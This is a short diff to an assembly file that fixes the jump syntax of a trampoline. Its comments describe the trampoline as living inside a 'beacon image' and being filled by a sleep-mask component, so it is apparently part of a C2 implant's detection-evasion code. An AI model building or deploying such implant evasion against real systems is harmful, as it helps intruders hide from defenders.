@@ -8,7 +8,7 @@
 ; call therefore returns HERE first - 16 bytes of executable section inside
 ; the beacon image - and jumps on to the stub:
 ;
-;   gated_tramp:    jmp qword ptr [gated_target]
+;   gated_tramp:    jmp qword ptr gated_target
 ;   gated_target:   dq <stub page: the call thunk's `after`>
 ;
 ; sleepmask_bofwin.cpp fills gated_target at engine build and keeps this
@@ -19,7 +19,7 @@ gtramp SEGMENT ALIGN(16) 'CODE'
 
 PUBLIC  gated_tramp
 gated_tramp PROC
-        jmp     qword ptr [rip + gated_target]
+        jmp     qword ptr gated_target      ; FF 25 disp32: rip-relative through the slot
 gated_tramp ENDP
 
 PUBLIC  gated_target
